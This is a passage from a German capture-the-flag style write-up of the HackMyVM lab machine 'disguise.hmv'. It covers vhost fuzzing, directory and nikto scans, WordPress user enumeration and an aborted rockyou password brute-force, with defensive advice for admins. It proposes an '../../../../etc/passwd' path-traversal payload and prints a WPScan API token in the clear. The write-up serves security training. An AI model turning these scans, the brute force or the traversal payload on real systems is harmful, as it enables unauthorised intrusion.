            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Gobuster-Scan sollte idealerweise vollständig durchlaufen oder mit einer fokussierteren Wortliste und relevanteren Erweiterungen (z.B. nur `php,html,txt,bak,zip`) wiederholt werden, um die Effizienz zu steigern. Manchmal können auch kleinere, spezifischere Wortlisten (z.B. für WordPress-Plugins oder -Themes) nützlich sein. Es ist wichtig, die Balance zwischen Gründlichkeit und Zeitaufwand zu finden. Alternative Tools wie `feroxbuster` oder `dirsearch` könnten ebenfalls in Betracht gezogen werden.<br><strong>Empfehlung (Admin):</strong> Webserver sollten so konfiguriert sein, dass sie keine unnötigen Informationen preisgeben (z.B. durch Server-Banner oder detaillierte Fehlerseiten). Verzeichnisauflistungen sollten deaktiviert sein. Eine Web Application Firewall (WAF) kann helfen, Brute-Force-Scans zu erkennen und zu blockieren.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://disguise.hmv" -H "Host: FUZZ.disguise.hmv" --hc "404" --hh 78369</span></div>
                    <pre>
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://disguise.hmv/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                      
=====================================================================

<span class="command">000000001:   301        0 L      0 W        0 Ch        "www"</span>                        
<span class="command">000005051:   200        18 L     52 W       846 Ch      "dark"</span>                        
 
Total time: 0
Processed Requests: 11833
Filtered Requests: 11829
Requests/sec.: 0
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Wfuzz wird hier für das Fuzzing von Subdomains (Virtual Hosts) verwendet.
                <ul>
                    <li><code>-c</code>: Farbige Ausgabe.</li>
                    <li><code>-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</code>: Gibt die Wortliste mit potenziellen Subdomain-Namen an.</li>
                    <li><code>-u "http://disguise.hmv"</code>: Die Basis-URL. Da es um VHost-Enumeration geht, ist der Pfad hier weniger relevant.</li>
                    <li><code>-H "Host: FUZZ.disguise.hmv"</code>: Dies ist der Kern des VHost-Fuzzings. Wfuzz ersetzt `FUZZ` mit jedem Eintrag aus der Wortliste und sendet die Anfrage mit dem modifizierten Host-Header an die IP-Adresse von `disguise.hmv`.</li>
                    <li><code>--hc "404"</code>: Versteckt Antworten mit dem HTTP-Statuscode 404 (Not Found).</li>
                    <li><code>--hh 78369</code>: Versteckt Antworten, deren Anzahl an Zeichen (Chars) in der Antwort 78369 beträgt. Dieser Wert wurde wahrscheinlich durch eine vorherige Analyse der "Standard"-Antwort für nicht existierende VHosts ermittelt, um False Positives herauszufiltern.</li>
                </ul>
                Der Scan fand zwei interessante Payloads:
                <ul>
                    <li>`www`: Ergibt `www.disguise.hmv`, was einen Status 301 (Moved Permanently) liefert. Dies ist oft eine Standardkonfiguration, die auf die Hauptdomain umleitet.</li>
                    <li>`dark`: Ergibt `dark.disguise.hmv`, was einen Status 200 (OK) mit einer bestimmten Anzahl von Zeilen, Wörtern und Zeichen liefert, die sich von der Standardantwort unterscheidet. Dies ist ein starker Hinweis auf eine existierende, separate Subdomain/VHost.</li>
                </ul>
                Der Scan scheint sehr schnell beendet worden zu sein oder nur einen kleinen Teil der Wortliste verarbeitet zu haben ("Processed Requests: 11833" von "Total requests: 114441").
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Die Entdeckung der Subdomain `dark.disguise.hmv` ist ein signifikanter Fortschritt. Oft hosten Subdomains unterschiedliche Anwendungen, Testversionen oder Admin-Interfaces, die andere Schwachstellen aufweisen können als die Hauptseite. Die Filterung mit `--hh` (hide characters) ist eine effektive Methode, um VHost-Fuzzing-Ergebnisse zu präzisieren, erfordert aber eine initiale Analyse der Baseline-Antwort.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die neu entdeckte Subdomain `dark.disguise.hmv` muss nun als separates Ziel behandelt und einer vollständigen Enumeration unterzogen werden (Portscan, Verzeichnis-Brute-Force, Technologieerkennung etc.). Der Eintrag `dark.disguise.hmv` sollte zur lokalen `/etc/hosts`-Datei hinzugefügt werden, um auf die korrekte IP-Adresse des Ziels zu verweisen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle konfigurierten Virtual Hosts notwendig und ordnungsgemäß gesichert sind. Nicht verwendete oder veraltete VHosts sollten entfernt werden. Führen Sie regelmäßige Scans auf Subdomains durch, um den Überblick über die eigene Web-Infrastruktur zu behalten (Asset Management).</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">vi /etc/hosts</span></div>
                    <pre>
                           
192.168.2.189   dark.disguise.hmv disguise.hmv
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Der Befehl `vi /etc/hosts` öffnet die lokale Hosts-Datei im Texteditor `vi`. Der Inhalt zeigt, dass ein Eintrag hinzugefügt wurde, der die IP-Adresse `192.168.2.189` sowohl dem Hostnamen `dark.disguise.hmv` als auch `disguise.hmv` zuordnet.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein notwendiger Schritt, um sicherzustellen, dass der angreifende Rechner Anfragen an `dark.disguise.hmv` und `disguise.hmv` korrekt an die IP-Adresse des Zielsystems sendet, insbesondere wenn kein interner DNS-Server diese Namen auflöst. Ohne diesen Eintrag würden Anfragen an diese Hostnamen wahrscheinlich ins Leere laufen oder vom öffentlichen DNS aufgelöst werden.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Bearbeiten der `/etc/hosts`-Datei ist Standardpraxis bei der Arbeit mit nicht öffentlich auflösbaren Hostnamen im internen Netzwerk oder beim Testen von Virtual Hosts. Es ist wichtig, diese Einträge nach Abschluss des Tests wieder zu entfernen oder auszukommentieren, um zukünftige Namensauflösungsprobleme zu vermeiden.<br><strong>Empfehlung (Admin):</strong> Für interne Dienste sollten idealerweise interne DNS-Server verwendet werden, um eine zentrale Verwaltung der Namensauflösung zu gewährleisten. Die manuelle Bearbeitung von Hosts-Dateien auf vielen Clients ist fehleranfällig und schlecht skalierbar.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">gobuster dir -u http://dark.disguise.hmv -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map -b '503,404' -e --no-error -k</span></div>
                    <pre>
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     <span class="command">http://dark.disguise.hmv</span>
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                <span class="command">/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
[+] Negative Status codes:   503,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              <span class="command">conf,lib,ln,jpg,sh,py,pdf,db,kdbx,config,diff,rar,bat,jpeg,phtml,pem,eps,js.map,aspx,exe,gz,cgi,php,pub,xls,icon,zip,sql,bak,c,java,csh,mod,txt,accdb,xlsx,mdb,doc,xml,csv,dll,html,json,deb,desc,raw,crt,exp,tar,old,pl,rpm,elf,ELF,ps1,asp,png,rtf,svg,docx</span>
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
<span class="command">http://dark.disguise.hmv/index.php</span>            (Status: 200) [Size: 873]
http://dark.disguise.hmv/.html                (Status: 403) [Size: 282]
http://dark.disguise.hmv/.phtml               (Status: 403) [Size: 282]
http://dark.disguise.hmv/.php                 (Status: 403) [Size: 282]
<span class="command">http://dark.disguise.hmv/images</span>               (Status: 301) [Size: 323] [--&gt; http://dark.disguise.hmv/images/]
<span class="command">http://dark.disguise.hmv/login.php</span>            (Status: 200) [Size: 1134]
<span class="command">http://dark.disguise.hmv/register.php</span>         (Status: 200) [Size: 2103]
<span class="command">http://dark.disguise.hmv/profile.php</span>          (Status: 302) [Size: 0] [--&gt; login.php]
<span class="command">http://dark.disguise.hmv/logout.php</span>           (Status: 302) [Size: 0] [--&gt; login.php]
<span class="command">http://dark.disguise.hmv/config.php</span>           (Status: 200) [Size: 0]
<span class="command">http://dark.disguise.hmv/captcha.php</span>          (Status: 200) [Size: 357]
<span class="command">http://dark.disguise.hmv/functions.php</span>        (Status: 200) [Size: 0]
<span class="command">http://dark.disguise.hmv/manager</span>              (Status: 301) [Size: 324] [--&gt; http://dark.disguise.hmv/manager/]
http://dark.disguise.hmv/.phtml               (Status: 403) [Size: 282]
http://dark.disguise.hmv/.php                 (Status: 403) [Size: 282]
http://dark.disguise.hmv/.html                (Status: 403) [Size: 282]
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ein weiterer Gobuster-Scan, diesmal gezielt auf die neu entdeckte Subdomain `http://dark.disguise.hmv`. Die Parameter sind identisch zum vorherigen Gobuster-Scan.
                Wichtige Funde auf `dark.disguise.hmv`:
                <ul>
                    <li><code>index.php</code> (Status 200): Die Hauptseite.</li>
                    <li><code>images/</code> (Status 301): Ein Verzeichnis, vermutlich für Bilder.</li>
                    <li><code>login.php</code> (Status 200): Eine Login-Seite. Dies ist interessant, da es sich von der WordPress-Login-Seite unterscheidet.</li>
                    <li><code>register.php</code> (Status 200): Eine Registrierungsseite.</li>
                    <li><code>profile.php</code> (Status 302 -> `login.php`): Eine Profilseite, die auf `login.php` umleitet, wenn man nicht angemeldet ist.</li>
                    <li><code>logout.php</code> (Status 302 -> `login.php`): Eine Logout-Funktion.</li>
                    <li><code>config.php</code> (Status 200, Size 0): Eine Konfigurationsdatei. Eine Größe von 0 könnte bedeuten, dass sie leer ist, oder dass der Zugriff auf den Inhalt auf andere Weise beschränkt ist, aber die Datei existiert. Oft ein sehr interessantes Ziel!</li>
                    <li><code>captcha.php</code> (Status 200): Eine Seite zur Captcha-Generierung/-Verarbeitung.</li>
                    <li><code>functions.php</code> (Status 200, Size 0): Eine Datei für Funktionen, ähnlich wie `config.php` mit Size 0.</li>
                    <li><code>manager/</code> (Status 301): Ein Verzeichnis namens "manager". Admin-Bereiche sind oft so benannt.</li>
                </ul>
                Der Scan wurde auch hier nicht vollständig ausgeführt (erkennbar am Fehlen der "Finished"-Meldung am Ende und der typischen Abbruchmeldung).
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Dieser Scan auf der Subdomain `dark.disguise.hmv` hat eine völlig andere Anwendungsstruktur als die WordPress-Seite auf der Hauptdomain aufgedeckt. Die Existenz von `login.php`, `register.php`, `config.php` (auch wenn Size 0) und einem `manager/`-Verzeichnis deutet auf eine benutzerdefinierte Anwendung oder ein anderes CMS/Framework hin. `config.php` und `functions.php` mit einer Größe von 0 sind verdächtig und könnten entweder leer sein oder der Zugriff auf ihren Inhalt wird blockiert, obwohl die Dateien existieren. Der `manager/`-Pfad ist ein primäres Ziel für weitere Untersuchungen.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Seite `dark.disguise.hmv` muss gründlich manuell untersucht werden: Registrierungsfunktion testen, Login-Seite auf Schwachstellen (SQLi, Username-Enumeration) prüfen. Das `manager/`-Verzeichnis ist besonders interessant und sollte ebenfalls mit Gobuster oder manuell weiter exploriert werden. Versuchen, den Inhalt von `config.php` und `functions.php` zu lesen (z.B. durch Local File Inclusion (LFI), falls eine solche Schwachstelle gefunden wird). Die Anwendung scheint PHP-basiert zu sein.<br><strong>Empfehlung (Admin):</strong> Sichern Sie alle benutzerdefinierten Anwendungen sorgfältig. Führen Sie Code-Audits durch, um Schwachstellen wie SQL-Injection, XSS, LFI etc. zu identifizieren. Stellen Sie sicher, dass Konfigurationsdateien (`config.php`) keine sensiblen Informationen preisgeben und nicht direkt über den Webserver zugänglich sind (z.B. außerhalb des Web-Roots speichern oder den Zugriff per `.htaccess` blockieren). Deaktivieren Sie die Registrierungsfunktion, wenn sie nicht benötigt wird.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nikto -h http://dark.disguise.hmv</span></div>
                    <pre>
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          <span class="command">192.168.2.189</span>
+ Target Hostname:    <span class="command">dark.disguise.hmv</span>
+ Target Port:        <span class="command">80</span>
+ Start Time:         2025-05-02 17:52:04 (GMT2)
---------------------------------------------------------------------------
+ Server: <span class="command">Apache/2.4.59 (Debian)</span>
+ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]
+ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]
+ /: <span class="password">Cookie PHPSESSID created without the httponly flag.</span> See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies]
+ <span class="password">No CGI Directories found</span> (use '-C all' to force check all possible dirs)
+ /database.tar.bz2: Drupal Link header found with value: &lt;http://disguise.hmv/wp-json/&gt;; rel="https://api.w.org/". See: [Link: https://www.drupal.org/ | Ziel: https://www.drupal.org/]
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ <span class="command">/config.php: PHP Config file may contain database IDs and passwords.</span>
+ http://127.0.0.1:2301/%20HTTP/1.0: <span class="command">Uncommon header 'x-redirect-by' found, with contents: WordPress.</span>
+ <span class="command">/icons/README: Apache default file found.</span> See: [Link: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/ | Ziel: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/]
+ <span class="command">/login.php: Admin login page/section found.</span>
+ 8046 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2025-05-02 17:52:29 (GMT2) (25 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Nikto-Scan auf die Subdomain `dark.disguise.hmv`.
                Wichtige Funde:
                <ul>
                    <li>Server-Version bestätigt: Apache/2.4.59 (Debian).</li>
                    <li>Fehlender `X-Frame-Options`-Header und `X-Content-Type-Options`-Header (wie bei der Hauptdomain).</li>
                    <li>`PHPSESSID`-Cookie ohne `HttpOnly`-Flag: Dies macht das Session-Cookie anfällig für Diebstahl durch clientseitige Skripte (XSS).</li>
                    <li>Interessanter Fund `/database.tar.bz2`: Nikto meldet hier einen Drupal Link Header, was wieder seltsam ist. Es ist unklar, ob diese Datei tatsächlich existiert oder ob es sich um einen Fehler von Nikto handelt. Eine Datei `database.tar.bz2` wäre ein extrem kritischer Fund, da sie wahrscheinlich eine Datenbanksicherung enthält.</li>
                    <li>`config.php`: Nikto hebt hervor, dass diese PHP-Konfigurationsdatei potenziell Datenbank-IDs und Passwörter enthalten könnte. Dies korreliert mit dem Gobuster-Fund.</li>
                    <li>Ungewöhnlicher Header `x-redirect-by: WordPress` (wie bei der Hauptdomain, was darauf hindeutet, dass einige Konfigurationen serverweit gelten oder dieser Header von einem vorgeschalteten Proxy kommt).</li>
                    <li>`/icons/README`: Eine Standarddatei von Apache, die oft versehentlich belassen wird und Informationen über die Serverkonfiguration preisgeben kann.</li>
                    <li>`/login.php`: Bestätigt die von Gobuster gefundene Login-Seite.</li>
                </ul>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Nikto hat mehrere wichtige Punkte auf `dark.disguise.hmv` aufgedeckt. Der Hinweis auf `config.php` und das `PHPSESSID`-Cookie ohne `HttpOnly` sind relevant. Der Fund `/database.tar.bz2` ist alarmierend und muss sofort manuell überprüft werden. Wenn diese Datei existiert und herunterladbar ist, wäre das ein schwerwiegender Informationsleck. Der wiederholte "Drupal Link header" und "x-redirect-by: WordPress" Header auf einer scheinbar Nicht-WordPress-Seite sind merkwürdig und könnten auf eine komplexe oder fehlerhafte Serverkonfiguration hinweisen.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> **Unbedingt manuell prüfen, ob `http://dark.disguise.hmv/database.tar.bz2` existiert und herunterladbar ist!** Den Inhalt von `config.php` untersuchen (wie zuvor erwähnt). Die Verwundbarkeit durch das fehlende `HttpOnly`-Flag für Session-Cookies in Verbindung mit potenziellen XSS-Schwachstellen ausnutzen. Die Datei `/icons/README` auf interessante Informationen prüfen.<br><strong>Empfehlung (Admin):</strong> **Sofort prüfen, ob eine Datei `database.tar.bz2` öffentlich zugänglich ist und diese ggf. entfernen und sicherstellen, dass keine Datenbanksicherungen im Web-Root liegen!** Das `HttpOnly`-Flag für alle Session-Cookies setzen. Fehlende Security-Header (X-Frame-Options, X-Content-Type-Options) implementieren. Den Zugriff auf `/icons/README` und andere Standard-Apache-Dateien einschränken.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">wpscan --url http://disguise.hmv/ --enumerate u --api-token RoBoAaM72LLsihOlqUJrA1EleT6AJAd9QxQ9rbmQNCY --passwords /usr/share/wordlists/rockyou.txt</span></div>
                    <pre>
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - [Link: https://automattic.com/ | Ziel: https://automattic.com/]
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://disguise.hmv/ [192.168.2.189]
[+] Started: Fri May  2 17:55:04 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: <span class="command">Server: Apache/2.4.59 (Debian)</span>
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://disguise.hmv/robots.txt
 | Interesting Entries:
 |  - <span class="command">/wp-admin/</span>
 |  - <span class="command">/wp-admin/admin-ajax.php</span>
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://disguise.hmv/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - [Link: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | Ziel: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/]
 |  - [Link: https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | Ziel: https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/]
 |  - [Link: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | Ziel: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/]
 |  - [Link: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ | Ziel: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/]

[+] WordPress readme found: http://disguise.hmv/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: <span class="command">http://disguise.hmv/wp-content/uploads/</span>
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://disguise.hmv/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - [Link: https://www.iplocation.net/defend-wordpress-from-ddos | Ziel: https://www.iplocation.net/defend-wordpress-from-ddos]
 |  - [Link: https://github.com/wpscanteam/wpscan/issues/1299 | Ziel: https://github.com/wpscanteam/wpscan/issues/1299]

Fingerprinting the version - Time: 00:00:04 &lt;=============&gt; (702 / 702) 100.00% Time: 00:00:04
[i] <span class="password">The WordPress version could not be detected.</span>

[+] WordPress theme in use: <span class="command">newscrunch</span>
 | Location: http://disguise.hmv/wp-content/themes/newscrunch/
 | Last Updated: 2025-04-29T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/newscrunch/readme.txt
 | <span class="password">[!] The version is out of date, the latest version is 1.8.4.6</span>
 | Style URL: http://disguise.hmv/wp-content/themes/newscrunch/style.css?ver=6.8.1
 | Style Name: Newscrunch
 | Style URI: [Link: https://spicethemes.com/newscrunch | Ziel: https://spicethemes.com/newscrunch]
 | Description: Newscrunch is a magazine and blog theme. It is a lightweight, elegant, and fully responsive theme sp...
 | Author: spicethemes
 | Author URI: [Link: https://spicethemes.com | Ziel: https://spicethemes.com]
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | <span class="command">Version: 1.8.4.2</span> (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/newscrunch/style.css?ver=6.8.1, Match: 'Version: 1.8.4.2'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 &lt;================&gt; (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] <span class="command">simpleadmin</span>
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://disguise.hmv/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] <span class="command">simpleAdmin</span>
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Performing password attack on Wp Login against 2 user/s
<span class="password">^C</span>
[i] <span class="password">No Valid Passwords Found.</span>

[+] WPScan DB API OK 1blade Time: 02:11:17 &lt;       &gt; (893985 / 28688946)  3.11%  ETA: 68:01:51
 | Plan: free
 | Requests Done (during the scan): 0
 | Requests Remaining: 23

[+] Finished: Fri May  2 20:06:33 2025
[+] Requests Done: 894709
[+] Cached Requests: 617
[+] Data Sent: 295.534 MB
[+] Data Received: 5.162 GB
[+] Memory used: 245.391 MB
[+] Elapsed time: 02:11:28

<span class="password">Scan Aborted: Canceled by User</span>
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> WPScan ist ein spezialisierter WordPress-Sicherheitsscanner.
                <ul>
                    <li><code>--url http://disguise.hmv/</code>: Ziel-URL.</li>
                    <li><code>--enumerate u</code>: Enumeriert Benutzer (Option `u`).</li>
                    <li><code>--api-token ...</code>: Ein API-Token für die WPScan Vulnerability Database, um auf aktuelle Schwachstelleninformationen zuzugreifen.</li>
                    <li><code>--passwords /usr/share/wordlists/rockyou.txt</code>: Versucht, die Passwörter für die enumerierten Benutzer mit der `rockyou.txt`-Liste zu knacken.</li>
                </ul>
                Wichtige Funde:
                <ul>
                    <li>Bestätigung von Standard-WordPress-Artefakten: `robots.txt`, `xmlrpc.php`, `readme.html`, offene Upload-Verzeichnisse, `wp-cron.php`. XML-RPC ist oft ein Vektor für Brute-Force-Angriffe oder DDoS.</li>
                    <li>WordPress-Version konnte nicht zuverlässig erkannt werden (obwohl Nmap zuvor 6.7.2 meldete).</li>
                    <li>Theme "newscrunch" Version 1.8.4.2 identifiziert. WPScan merkt an, dass es veraltet ist (neueste Version 1.8.4.6). Dies ist ein potenzieller Schwachstellenindikator.</li>
                    <li>Benutzer "simpleadmin" und "simpleAdmin" (Groß-/Kleinschreibung) wurden enumeriert.</li>
                    <li>Der Passwort-Brute-Force-Angriff wurde nach über 2 Stunden und 3.11% der `rockyou.txt`-Liste abgebrochen (`^C`). Es wurden keine gültigen Passwörter gefunden.</li>
                </ul>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> WPScan liefert eine Fülle an Informationen. Die Identifizierung eines veralteten Themes ("newscrunch 1.8.4.2") ist ein wichtiger Fund, da veraltete Software oft bekannte Schwachstellen enthält. Die Benutzerenumeration bestätigt "simpleAdmin". Der Brute-Force-Angriff war bisher erfolglos, aber die `rockyou.txt` ist sehr umfangreich; ein Abbruch bedeutet nicht, dass kein schwaches Passwort existiert. XML-RPC ist aktiviert und sollte im Auge behalten werden.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Recherchieren Sie spezifische Schwachstellen für das Theme "newscrunch" Version 1.8.4.2. Der Brute-Force-Angriff könnte mit einer kleineren, gezielteren Wortliste oder über einen längeren Zeitraum fortgesetzt werden, insbesondere gegen den `xmlrpc.php`-Endpunkt, der oft effizienter für Brute-Force ist als `wp-login.php`. Untersuchen Sie das aktivierte XML-RPC auf bekannte Angriffsvektoren.<br><strong>Empfehlung (Admin):</strong> Aktualisieren Sie das WordPress-Theme "newscrunch" dringend auf die neueste Version. Deaktivieren Sie XML-RPC, wenn es nicht unbedingt benötigt wird ([Link: https://wordpress.org/plugins/disable-xml-rpc/ | Ziel: https://wordpress.org/plugins/disable-xml-rpc/]). Stellen Sie sicher, dass alle Benutzer starke, einzigartige Passwörter verwenden und implementieren Sie eine Login-Lockout-Policy. Deaktivieren Sie die Verzeichnisauflistung für das Upload-Verzeichnis (`wp-content/uploads/`).</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
view-source:http://dark.disguise.hmv/index.php

 href="login.php" 登录  |  a href="register.php" 注册 
 &lt;h3&gt;dark mouse&lt;/h3&gt;
 &lt;img src="image_handler.php?id=7"&gt; 
 A great mouse price = ¥50.00 

 &lt;h3&gt;dark clothes&lt;/h3&gt;
 &lt;img src="image_handler.php?id=8"&gt;
 very dark clothes price = ¥200.00 
 
 &lt;h3&gt;dark soul&lt;/h3&gt; 
 &lt;img src="image_handler.php?id=9"&gt; 
 a great game price = ¥300.00 
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Dies ist ein Auszug aus dem Quelltext der Seite `http://dark.disguise.hmv/index.php`. Interessant sind hier die Bild-Tags (`&lt;img src="..."&gt;`). Die Bilder werden über ein PHP-Skript `image_handler.php` geladen, dem eine `id` als Parameter übergeben wird (z.B. `image_handler.php?id=7`).</p>
            <p class="evaluation"><strong>Bewertung:</strong> Die Verwendung eines Skripts zum Laden von Bildern (`image_handler.php`) ist ein potenzieller Indikator für eine Local File Inclusion (LFI) oder Remote File Inclusion (RFI) Schwachstelle, wenn die Benutzereingabe (hier der `id`-Parameter) nicht ordnungsgemäß validiert und sanitisiert wird. Wenn das Skript versucht, eine Datei basierend auf diesem Parameter vom Dateisystem zu laden, könnte ein Angreifer versuchen, Pfade zu anderen Dateien anzugeben.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen Sie den `image_handler.php`-Endpunkt auf LFI-Schwachstellen. Versuchen Sie, gängige Payloads wie `../../../../etc/passwd` oder Pfade zu bekannten Konfigurationsdateien (z.B. `config.php`, das zuvor von Gobuster gefunden wurde) über den `id`-Parameter zu laden. Untersuchen Sie, ob das Skript auch Filter umgehen kann (z.B. Null-Byte-Injektion, Pfad-Traversal-Variationen).<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Skripte, die Dateien basierend auf Benutzereingaben laden (wie `image_handler.php`), strenge Validierungen und Sanitisierungen durchführen. Idealerweise sollten keine direkten Dateipfade aus Benutzereingaben konstruiert werden. Verwenden Sie Whitelists für erlaubte Dateien/Pfade oder stellen Sie sicher, dass der Pfad-Traversal unmöglich ist (z.B. durch `basename()` in PHP und Überprüfung, ob die Datei in einem erlaubten Verzeichnis liegt).</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">wpscan --url http://disguise.hmv/ --enumerate u,vp,vt,tt --api-token RoBoAaM72LLsihOlqUJrA1EleT6AJAd9QxQ9rbmQNCY</span></div>
                    <pre>
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - [Link: https://automattic.com/ | Ziel: https://automattic.com/]
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://disguise.hmv/ [192.168.2.189]
[+] Started: Sat May  3 00:53:27 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: <span class="command">Server: Apache/2.4.59 (Debian)</span>
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://disguise.hmv/robots.txt
 | Interesting Entries:
 |  - <span class="command">/wp-admin/</span>
 |  - <span class="command">/wp-admin/admin-ajax.php</span>
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://disguise.hmv/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 [...]

